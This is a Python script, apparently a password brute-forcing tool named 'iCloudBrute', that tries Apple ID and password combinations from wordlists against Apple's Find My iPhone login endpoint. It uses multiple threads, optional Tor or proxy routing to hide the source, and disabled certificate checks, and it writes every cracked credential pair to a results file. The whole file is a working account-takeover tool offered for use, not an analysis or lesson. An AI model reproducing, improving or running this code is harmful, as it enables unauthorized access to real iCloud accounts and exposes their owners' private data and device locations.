import sys
import getopt
import plistlib
import requests
from requests.auth import HTTPBasicAuth
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3
import time
from datetime import datetime

class iCloudBrute:
    def __init__(self, args):
        self.args = args
        self.max_threads = 10
        self.success_count = 0
        self.attempt_count = 0
        self.start_time = time.time()
        self.results_file = "results.txt"

    def readfile(self, path):
        with open(path, 'r', encoding='utf-8') as f:
            return [line.strip() for line in f if line.strip()]

    @property
    def tor(self):
        return 'socks5h://127.0.0.1:9050'

    def banner(self):
        print(r"""
     _        ,..  
,-- Optimized by 1byword        """)

    def usage(self):
        print("Usage: %s [options]\n" % sys.argv[0])
        print("\t--id\t\tApple ID")
        print("\t--idw\t\tApple ID Wordlist")
        print("\t--wordlist\tWordlist")
        print("\t--proxy\t\tSet proxy")
        print("\t--tor\t\tUse tor\n")
        exit()

    def interactive_input(self):
        print("[ ! ] No arguments passed. Enter values manually:")
        apple_id = input("Apple ID (or leave empty to use ID wordlist): ").strip()
        idw = "" if apple_id else input("Path to Apple ID wordlist: ").strip()
        wordlist = input("Path to password wordlist: ").strip()
        proxy = input("Proxy (or leave empty): ").strip()
        use_tor = input("Use TOR? (y/n): ").lower().startswith('y')

        args = []
        if apple_id: args += ["--id", apple_id]
        if idw: args += ["--idw", idw]
        args += ["--wordlist", wordlist]
        if proxy: args += ["--proxy", proxy]
        if use_tor: args.append("--tor")
        return args

    def main(self):
        self.banner()

        if not self.args:
            self.args = self.interactive_input()

        tor = False
        apple_id = None
        proxy = None
        idw = None
        wordlist = None

        try:
            opts, _ = getopt.getopt(self.args, "", ["id=", "idw=", "wordlist=", "proxy=", "tor"])
        except getopt.GetoptError:
            self.usage()

        for opt, arg in opts:
            if opt == "--id": apple_id = arg
            elif opt == "--idw": idw = arg
            elif opt == "--wordlist": wordlist = arg
            elif opt == "--proxy": proxy = arg
            elif opt == "--tor": tor = True

        if apple_id and wordlist:
            print(f'[ i ] Starting brute-force for ID: {apple_id}')
            passwords = self.readfile(wordlist)
            self.brute_worker([(apple_id, p) for p in passwords], proxy, tor)
        elif idw and wordlist:
            print('[ i ] Starting brute-force for multiple Apple IDs...')
            ids = self.readfile(idw)
            passwords = self.readfile(wordlist)
            combos = [(i, p) for i in ids for p in passwords]
            self.brute_worker(combos, proxy, tor)
        else:
            self.usage()

        self.print_summary()

    def brute_worker(self, combos, proxy, tor):
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            future_to_combo = {
                executor.submit(self.check, email, pwd, proxy, tor): (email, pwd)
                for email, pwd in combos
            }
            for future in as_completed(future_to_combo):
                email, pwd = future_to_combo[future]
                try:
                    result = future.result()
                    self.attempt_count += 1
                    if result is True:
                        self.success_count += 1
                        self.save_result(email, pwd)
                        print(f"[ + ] FOUND! ID: {email} | PASS: {pwd}")
                except Exception as e:
                    print(f"[ ! ] Error on {email}:{pwd} -> {e}")

    def check(self, apple_id, passwd, proxy, tor):
        proxies = {}
        if tor:
            proxies = {'http': self.tor, 'https': self.tor}
        elif proxy:
            proxies = {'http': proxy, 'https': proxy}

        url = f"https://fmipmobile.icloud.com/fmipservice/device/{apple_id}/initClient"
        headers = {
            'User-Agent': 'FindMyiPhone/3.0 CFNetwork/672.0.2 Darwin/14.0.0'
        }

        payload = {
            "clientContext": {
                "appName": "FindMyiPhone",
                "osVersion": "7.0.4",
                "clientTimestamp": int(time.time()),
                "appVersion": "3.0",
                "deviceUDID": "0123456789abcdef",
                "inactiveTime": 1,
                "buildVersion": "376",
                "productType": "iPhone6,1"
            },
            "serverContext": {}
        }

        data = plistlib.dumps(payload)
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

        try:
            response = requests.post(
                url=url,
                data=data,
                headers=headers,
                proxies=proxies,
                auth=HTTPBasicAuth(apple_id, passwd),
                verify=False,
                timeout=5
            )
            if response.status_code == 330:
                return True
            elif response.status_code == 401:
                return False
            elif response.status_code == 403:
                time.sleep(2)
                return None
        except requests.RequestException:
            return None

    def save_result(self, email, pwd):
        with open(self.results_file, 'a', encoding='utf-8') as f:
            f.write(f"{email}:{pwd}\n")

    def print_summary(self):
        duration = time.time() - self.start_time
        speed = self.attempt_count / duration if duration else 0
        print("\n[ ✅ ] Summary:")
        print(f"  Attempts       : {self.attempt_count}")
        print(f"  Successes      : {self.success_count}")
        print(f"  Duration       : {duration:.2f} seconds")
        print(f"  Speed          : {speed:.2f} tries/sec")
        print(f"  Results saved  : {self.results_file}")


if __name__ == "__main__":
    try:
        iCloudBrute(sys.argv[1:]).main()
    except KeyboardInterrupt:
        print("\n[ ! ] Stopped by user.")
        exit()
